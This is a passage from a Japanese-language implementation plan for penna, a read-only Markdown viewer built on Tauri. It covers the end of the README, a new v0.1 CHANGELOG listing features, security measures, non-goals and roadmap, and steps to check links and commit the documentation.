任意のローカル/リモート Markdown を WebView で描画するため、描画 HTML は必ず DOMPurify で無害化します（スクリプト・イベントハンドラ・`javascript:` URL・`<iframe>`/`<style>` を除去）。ローカル画像は Tauri の asset protocol を**開いたファイルのディレクトリにスコープ**して表示し、フロントエンドは生のファイルシステムに直接アクセスしません。

## ドキュメント

- 設計仕様: [docs/superpowers/specs/2026-06-14-penna-viewer-design.md](docs/superpowers/specs/2026-06-14-penna-viewer-design.md)
- v0.1 スコープ / 変更履歴: [CHANGELOG.md](CHANGELOG.md)
- 手動スモークチェックリスト: [docs/smoke-checklist.md](docs/smoke-checklist.md)

## ライセンス

MIT License. 詳細は [LICENSE](LICENSE) を参照してください。
```

- [ ] **Step 2: README のリンク先ファイルが存在することを確認する**

なぜ必要か: README から張った相対リンク（設計仕様・CHANGELOG・スモークチェックリスト・LICENSE）が壊れていないことを確認するため。CHANGELOG は次の Step で作成するので、ここでは既存分を確認する。

```
Run: ls docs/superpowers/specs/2026-06-14-penna-viewer-design.md docs/smoke-checklist.md LICENSE
Expected: 3 件すべて存在（CHANGELOG.md は次ステップで作成）
```

- [ ] **Step 3: CHANGELOG.md（v0.1 スコープ）を新規作成する**

`CHANGELOG.md` を新規作成する。なぜ必要か: v0.1 で「入れたもの・入れなかったもの（非ゴール）」を明文化し、将来ロードマップとの境界を固定するため。どう書くか: Keep a Changelog 形式に近い構成で、`Added`（v0.1 スコープ）・`Not included`（非ゴール）・`Roadmap`（将来）を日本語で列挙する。

```markdown
# Changelog

本プロジェクトの変更履歴。フォーマットは [Keep a Changelog](https://keepachangelog.com/) に準拠し、[Semantic Versioning](https://semver.org/) を採用します。

## [Unreleased]

（次リリースに向けた変更をここに記載）

## [0.1.0] - v0.1 スコープ（MVP）

penna の初回リリース。軽量な Markdown/プレーンテキスト ビューワー（読み取り専用）。

### Added（v0.1 で入れたもの）

- Markdown 描画（tier-1）: CommonMark + GFM（表・タスクリスト・打消し線・自動リンク）+ 脚注
- コードブロックのシンタックスハイライト（highlight.js、遅延ロード）
- プレーンテキスト描画（等幅・ソフトラップ・空白/改行保持）
- 文字エンコーディング自動判定（UTF-8 / UTF-16(BOM) / Shift-JIS / EUC-JP）、判定結果のウィンドウ内表示
- テーマ: OS 追従（ライト/ダーク）＋手動トグル（設定で保存）
- ドキュメント内検索（Cmd/Ctrl+F、一致件数・前後移動）
- フォント拡大縮小（Cmd/Ctrl +/-/0）
- 外部変更の自動リロード（notify によるファイル監視 + 150ms デバウンス、トグル可・既定 ON）
- ファイル削除/リネーム時の graceful なバナー表示（`file-removed`）
- ファイルを開く経路: CLI 引数 / Finder・Explorer ダブルクリック（拡張子関連付け）/ ドラッグ&ドロップ / File > Open ダイアログ
- 単一インスタンス（二次起動引数を 1 プロセスに集約し新規ウィンドウ化）
- セッション復元（`sessionRestore`、既定 OFF）: ON にすると次回起動で前回開いていたファイル群を開き直す
- 設定永続化（theme / sessionRestore / autoReload / fontFamily / fontSize / defaultEncoding）
- DOMPurify による描画 HTML の無害化、ローカル画像の asset protocol スコープ制限

### Security

- スクリプト・イベントハンドラ・`javascript:` URL・`<iframe>`/`<style>` を除去する DOMPurify 設定
- ローカル画像/相対パスはすべて `convertFileSrc`（asset protocol）経由とし、フロントは生 `fs` を叩かない

### Not included（v0.1 の非ゴール）

- 編集機能（保存・書き込みは一切なし。読み取り専用）
- タブ機能（ウィンドウモデルは「1 ファイル＝1 ウィンドウ」に確定）
- ターミナル内レンダリング（TUI）
- 数式（KaTeX）/ mermaid 図（tier-2）
- アウトライン/目次サイドバー、ソース表示トグル、最近開いたファイル
- PDF/HTML エクスポート
- リモート画像ブロック設定
- 自動更新（Tauri updater）
- Windows/Linux のコード署名（macOS のみ署名・公証）

### Roadmap（v0.1 以降）

- tier-2 描画: KaTeX 数式 / mermaid 図（遅延ロードのプラグインとして追加）
- アウトライン/目次サイドバー
- PDF/HTML エクスポート・印刷の作り込み
- ソース（生テキスト）表示トグル
- 最近開いたファイル
- リモート画像ブロック設定
- 自動更新（Tauri updater）
- パッケージマネージャ配布（brew cask / winget / AUR・Flatpak）
- Windows コード署名
- E2E テスト（tauri-driver + WebdriverIO）の常時化

[Unreleased]: https://github.com/btajp/penna/compare/v0.1.0...HEAD
[0.1.0]: https://github.com/btajp/penna/releases/tag/v0.1.0
```

- [ ] **Step 4: ドキュメントの相互リンクと存在を最終確認する**

なぜ必要か: README から張ったすべての相対リンク先が存在し、リンク切れが無いことを確認するため。

```
Run: ls README.md CHANGELOG.md LICENSE docs/smoke-checklist.md docs/superpowers/specs/2026-06-14-penna-viewer-design.md
Expected: 5 件すべて存在
```

- [ ] **Step 5: README と CHANGELOG をコミットする**

なぜ必要か: ドキュメント整備を独立した変更として記録するため。Conventional Commits の `docs:` を使う。

```
Run: git add README.md CHANGELOG.md
Run: git commit -m "docs: add README and v0.1 scope CHANGELOG"
Expected: 1 commit created.
```
